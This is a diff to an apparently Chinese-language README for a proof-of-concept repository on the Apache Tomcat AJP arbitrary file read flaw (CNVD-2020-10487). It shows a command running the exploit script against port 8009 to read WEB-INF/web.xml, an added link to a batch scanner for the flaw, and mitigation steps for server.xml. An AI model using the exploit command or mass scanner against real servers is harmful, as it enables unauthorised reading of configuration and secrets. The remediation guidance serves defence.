@@ -23,6 +23,11 @@ Apache Tomcat = 6
 任意文件读取
 ```py -2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml```  
 ![漏洞截图](https://github.com/bmjoker/poc/blob/master/Tomcat/2.png)  
+
+于2020.03.02补充
+网上出现了批量刷取AJP漏洞的脚本
+参考链接：https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
+
 # 漏洞修复：  
 * 临时禁用AJP协议端口，在conf/server.xm l配置文件中注释掉```<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />```   
 * 配置ajp配置中的secretRequired跟secret属性来限制认证  
